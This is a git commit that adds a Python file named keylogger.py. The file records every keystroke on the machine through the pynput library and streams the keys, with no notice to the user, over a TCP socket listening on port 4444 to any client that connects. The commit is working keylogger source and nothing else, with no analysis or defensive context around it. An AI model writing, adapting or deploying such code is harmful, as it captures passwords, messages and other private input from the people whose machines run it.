b678d7367865a33054d55ea8020d535b42d3c996
cellhck <85413364+cellhck@users.noreply.github.com>
2021-08-28 23:19:59 -0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,30 @@
+from typing import List
+from pynput.keyboard import Listener
+from socket import *
+
+
+s = socket(AF_INET, SOCK_STREAM)
+s.bind(('0.0.0.0', 4444))
+s.listen(2)
+
+while True:
+    obj, addr = s.accept()
+
+    def on_press(key):
+        key = str(key)
+
+        if key == "Key.enter":
+            obj.send(b"\n")
+        
+        elif key == "Key.space":
+            obj.send(b" ")
+        
+        else:
+            obj.send(bytes(key.replace("'", ""),"utf-8"))
+
+    try:
+        with Listener(on_press) as lis:
+            lis.join()
+    
+    except:
+        obj.close()
